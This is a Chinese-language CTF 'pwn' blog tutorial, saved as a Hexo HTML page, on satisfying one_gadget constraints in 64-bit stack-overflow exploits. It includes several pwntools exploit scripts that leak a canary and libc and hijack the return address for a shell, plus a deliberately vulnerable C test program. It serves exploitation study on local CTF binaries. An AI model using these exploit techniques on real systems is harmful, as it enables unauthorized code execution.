@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>One_gadget | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="本文首发先知 问题来源在有 one_gadget 之前,我们一般都是通过常规 rop 的方式 getshell .有了它之后,知道 libc 偏移就能够通过它的地址一步 getshell .详细介绍参见此处,我们就可以把更多精力花在利用漏洞上边.但是在做栈溢出时经常遇到 one_gadget 的佛系 bug ,究其原因还是 constraints 的锅,每次执行都是一次execve(&quot;&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="One_gadget">
+<meta property="og:url" content="http://example.com/2019/10/20/2019-10-20-one_gadget/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="本文首发先知 问题来源在有 one_gadget 之前,我们一般都是通过常规 rop 的方式 getshell .有了它之后,知道 libc 偏移就能够通过它的地址一步 getshell .详细介绍参见此处,我们就可以把更多精力花在利用漏洞上边.但是在做栈溢出时经常遇到 one_gadget 的佛系 bug ,究其原因还是 constraints 的锅,每次执行都是一次execve(&quot;&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-10-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2019-10-20-one_gadget" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/20/2019-10-20-one_gadget/" class="article-date">
+  <time class="dt-published" datetime="2019-10-19T16:00:00.000Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      One_gadget
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>本文首发<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6598">先知</a></p>
+<h2 id="问题来源"><a href="#问题来源" class="headerlink" title="问题来源"></a>问题来源</h2><p>在有 <code>one_gadget</code> 之前,我们一般都是通过常规 rop 的方式 getshell .有了它之后,知道 libc 偏移就能够通过它的地址一步 getshell .详细介绍参见<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2720">此处</a>,我们就可以把更多精力花在利用漏洞上边.但是在做栈溢出时经常遇到 one_gadget 的佛系 bug ,究其原因还是 <code>constraints</code> 的锅,每次执行都是一次<code>execve(&quot;/bin/sh&quot;,?????, environ)</code>未知考验,这时候就有必要去根据限制条件来布置我们的环境了</p>
+<p>注:以下程序均为 64 位.关于 32 位程序的可以参见上述文章自行研究</p>
+<h2 id="溢出字节数较大"><a href="#溢出字节数较大" class="headerlink" title="溢出字节数较大"></a>溢出字节数较大</h2><blockquote>
+<p>突破栈限制条件</p>
+</blockquote>
+<p>以西湖论剑的 story 举例,一个简单的格式化字符串和栈溢出漏洞(就不具体分析漏洞了),通过前者可以泄漏 canary 和 libc 基址,后者就是一个溢出劫持 rop 了.似乎已经很简单了,能不能再简单??这时候 one_gedget 就有用了,直接把 ret 改成 one_gedget 即可,我们来看一下这个 exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;story&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">p.sendline(&quot;%15$p%25$p&quot;)</span><br><span class="line"># leak canary and libc_addr</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">canary = int(p.recvuntil(&quot;0x&quot;)[:-2],16)</span><br><span class="line">addr_offset = int(p.recvuntil(&#x27;\n&#x27;)[:-1],16)</span><br><span class="line">libc_base = addr_offset - libc.symbols[&#x27;__libc_start_main&#x27;]-240</span><br><span class="line">one = libc_base+0x4526a</span><br><span class="line">p.recvuntil(&#x27;story&#x27;)</span><br><span class="line">p.sendline(&#x27;1024&#x27;)</span><br><span class="line"># story_len = 1024</span><br><span class="line">p.recvuntil(&#x27;story&#x27;)</span><br><span class="line">payload = &#x27;\x00&#x27;*0x88+p64(canary)+p64(0)+p64(one)</span><br><span class="line"># buf_len = 0x88</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>one = libc_base+0x4526a</code>的<code>0x4526a</code>就是用 one_gadget 找到的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure>
+
+<p>但是最终还是因为条件的限制后三个都成功不了(很真实)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">:</span><br><span class="line">[*] Process &#x27;./story&#x27; stopped with exit code 127 (pid 17986)</span><br><span class="line">1�I��^H\x89�H���PTI���</span><br><span class="line">                      @: 0: Can&#x27;t open </span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Got EOF while sending in interactive</span><br></pre></td></tr></table></figure>
+
+<p>这时候就要想一下我们还能控制什么,事实上这题很巧,能利用的缓冲区很大</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( v1 &gt; 128 )</span><br><span class="line">  v1 = 1024LL;</span><br></pre></td></tr></table></figure>
+
+<p>所以可以搞点骚操作,比如可以直接向最后的 buf 多加点东西,如填入 <code>payload = 0x88*&#39;\x00&#39;+p64(canary)+p64(0)+p64(one)+p64(0)*100</code> ,加了<code>p64(0)*100</code>,毕竟不用白不用不是.</p>
+<p>这绝对满足上述的栈限制的所有条件,基本上是一种栈条件通杀的方式.当然这种方式很局限,比如说控制不到栈,或者限制条件是寄存器,这时候就要看下边的技巧了</p>
+<h2 id="利用-leave"><a href="#利用-leave" class="headerlink" title="利用 leave"></a>利用 leave</h2><blockquote>
+<p>结合 bss 端精准打击</p>
+</blockquote>
+<p>我们自己写一段程序进行测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">char x[500]=&#123;0&#125;;</span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">	char buf[128];</span><br><span class="line">	char a[100];</span><br><span class="line">	scanf(&quot;%s&quot;,a);</span><br><span class="line">	printf(a);</span><br><span class="line">	printf(&quot;done\n&quot;);</span><br><span class="line">	read(0, buf, 256);</span><br><span class="line">	printf(&quot;ok\n&quot;);</span><br><span class="line">	read(0, x, 20);</span><br><span class="line">	write(1, &quot;Hello, World\n&quot;, 13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个是比较符合我的想法的,当然可以用上边的方法,因为这个程序把 read 的字节设置的很大(这样便于一个程序贯穿全篇,不用反复修改).用 gcc 编译(<code>gcc -fno-stack-protector -o test test.c</code>),我在这里把 canary 关了,大家可以自行取舍.一个格式化字符串用于泄漏,一个溢出用于控制程序流程.但是这个在本机打的话 one_gadget 不经过修改也能用, exp1 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;./test&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p.sendline(&quot;%39$p&quot;)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line"></span><br><span class="line">addr = int(p.recvuntil(&quot;done\n&quot;)[:-5],16)</span><br><span class="line">libc_base = addr - libc.symbols[&#x27;__libc_start_main&#x27;]-0xf0</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">one = libc_base+0xf1147</span><br><span class="line">pay = 136*&#x27;\x00&#x27;+p64(one)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.recvuntil(&#x27;ok\n&#x27;)</span><br><span class="line">p.sendline(&#x27;123&#x27;)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>__libc_start_main+240</code>偏移是 39 .但我觉得还是不够优雅,能不能不抱侥幸心理,必定成功?? exp2 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;./test&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p.sendline(&quot;%39$p&quot;)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line"></span><br><span class="line">addr = int(p.recvuntil(&quot;done\n&quot;)[:-5],16)</span><br><span class="line">libc_base = addr - libc.symbols[&#x27;__libc_start_main&#x27;]-0xf0</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">one = libc_base+0xf1147</span><br><span class="line"></span><br><span class="line">pay = (136-8)*&#x27;\x00&#x27;+p64(0x601080)+p64(0x400702)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line">p.recvuntil(&#x27;ok\n&#x27;)</span><br><span class="line">payload = p64(one)*2</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>可以看到我在 pay 构造上把之前一直被我们忽视的 ebp 改成了 bss 端,然后的<code>p64(0x400702)</code>是 leave 地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400702                 leave</span><br><span class="line">.text:0000000000400703                 retn</span><br></pre></td></tr></table></figure>
+
+<p>大家应该了然了,这就是一个常规的栈迁移,迁移到 bss 后我们有 20 个字节可控,已经够了,很暴力填入两个 one_gadget 就完事</p>
+<p>当然大家应该都知道,这个的关键就在于程序到底开没开 PIE 了,没开一切好说,开了就只能泄漏(泄漏 bss 地址可还行,我没见过),没有泄漏就得另某出路了</p>
+<h2 id="rax-null"><a href="#rax-null" class="headerlink" title="rax &#x3D;&#x3D; null"></a>rax &#x3D;&#x3D; null</h2><p>回到一开始的问题,我们的限制条件只有两种,一个是 rax 一个就是栈,那控制 rax 能好用吗??事实上直接去控制 rax 的值是很难做到的,在看了很多程序的汇编后我发现真正用 rax 的虽然很多很多,但都用不了,不是离 ret 太远就是只能控制 eax 写为 0 ,难以做到两全其美.这时候我们换个思路,根据返回值下手,就比如之前说的自己写的这个程序,在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br></pre></td></tr></table></figure>
+
+<p>就是好用的, exp3 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;./test&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p.sendline(&quot;%39$p&quot;)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line"></span><br><span class="line">addr = int(p.recvuntil(&quot;done\n&quot;)[:-5],16)</span><br><span class="line">libc_base = addr - libc.symbols[&#x27;__libc_start_main&#x27;]-0xf0</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">one = libc_base+0x45216</span><br><span class="line">pay = 136*&#x27;\x00&#x27;+p64(one)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.recvuntil(&#x27;ok\n&#x27;)</span><br><span class="line">p.sendline(&#x27;123&#x27;)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>原因就是 write 返回值可控,之后程序很舒服的做了一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006F8                 call    _write</span><br><span class="line">.text:00000000004006FD                 mov     eax, 0</span><br><span class="line">.text:0000000000400702                 leave</span><br><span class="line">.text:0000000000400703                 retn</span><br></pre></td></tr></table></figure>
+
+<p>操作,让我们获得了 shell ,但是其他的程序就不是如此了.例如之前所说的 story ,这个程序关于 rax 最后的调用关系如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400A21                 lea     rax, [rbp+s]</span><br></pre></td></tr></table></figure>
+
+<p>把 <code>rbp+s</code> 给了 rax ,之后就没有对其的修改了,这 one_gadget 能用就太假了.</p>
+<p>事实上别的 libc 版本还有别的寄存器限制,如 rcx 等等.所以只能想一些方法争取主动的变换寄存器的值,确实难度很大.</p>
+<h2 id="万能-gadget"><a href="#万能-gadget" class="headerlink" title="万能 gadget"></a>万能 gadget</h2><blockquote>
+<p>最强武器</p>
+</blockquote>
+<p>既然控制寄存器很恶心那就把重点放在栈上.</p>
+<p>不是还有一个万能 gadget 吗,尝试进行 pop 行不行(应该是最舒服的思路)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400766                 add     rsp, 8</span><br><span class="line">.text:000000000040076A                 pop     rbx</span><br><span class="line">.text:000000000040076B                 pop     rbp</span><br><span class="line">.text:000000000040076C                 pop     r12</span><br><span class="line">.text:000000000040076E                 pop     r13</span><br><span class="line">.text:0000000000400770                 pop     r14</span><br><span class="line">.text:0000000000400772                 pop     r15</span><br><span class="line">.text:0000000000400774                 retn</span><br></pre></td></tr></table></figure>
+<p>exp4 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p= process(&#x27;./test&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p.sendline(&quot;%39$p&quot;)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line"></span><br><span class="line">addr = int(p.recvuntil(&quot;done\n&quot;)[:-5],16)</span><br><span class="line">libc_base = addr - libc.symbols[&#x27;__libc_start_main&#x27;]-0xf0</span><br><span class="line">info(&quot;libc:0x%x&quot;,libc_base)</span><br><span class="line">one = libc_base+0xf02a4</span><br><span class="line">pay = 136*&#x27;\x00&#x27;+p64(0x400766)+p64(0)*7+p64(one)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.recvuntil(&#x27;ok\n&#x27;)</span><br><span class="line">p.sendline(&#x27;123&#x27;)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>可以看到,调整起来很灵活,不用必须 pop 7 个,溢出字节数目可观的话基本都能实现 getshell ,毕竟<code>p64(0)*7</code>确实很占宝贵的字节数目,导致这个版本 libc 还没有第一种效率高,一种走弯路的感觉</p>
+<p>至少我能想到的思路就这些,欢迎大家讨论交流</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇主要是栈的研究,而堆也有一些很骚的思路,比如说:改 malloc_hook 为 one_gadget 不好用是常有的事,这时候可以利用 realloc_hook 去微微(因为 pop push 数量受限)调整栈情况,具体可参阅<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-246786.htm">师傅帖子</a>, tql </p>
+<p>等等</p>
+<p>这篇文章旨在开拓大家的思路,不被条件限制住.毕竟真的不能用 one_gadget 的时候不还有 rop 保底的吗,2333</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/20/2019-10-20-one_gadget/" data-id="cuid4luRxeRaFR_KGdeoXsFOw" data-title="One_gadget" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/10/21/2019-10-21-3rd_week/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          third week
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/11/2019-10-11-1st_week/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">first week</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/AI/">AI</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzz/" rel="tag">Fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ai/" rel="tag">ai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chat/" rel="tag">chat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 17.5px;">CTF</a> <a href="/tags/Fuzz/" style="font-size: 10px;">Fuzz</a> <a href="/tags/Misc/" style="font-size: 12.5px;">Misc</a> <a href="/tags/Web/" style="font-size: 12.5px;">Web</a> <a href="/tags/ai/" style="font-size: 10px;">ai</a> <a href="/tags/chat/" style="font-size: 15px;">chat</a> <a href="/tags/fuzz/" style="font-size: 10px;">fuzz</a> <a href="/tags/misc/" style="font-size: 17.5px;">misc</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/tools/" style="font-size: 10px;">tools</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/08/">August 1999</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1999/01/">January 1999</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/10/01/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/27/2023-06-27-fuzzer/">如何完成一个 fuzzer</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-05-31-report/">安全开发</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/31/2023-06-18-fixandPR/">记一次 fuzz go 的一个第三方库</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/23/2023-05-23-waf/">AI 安全之</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
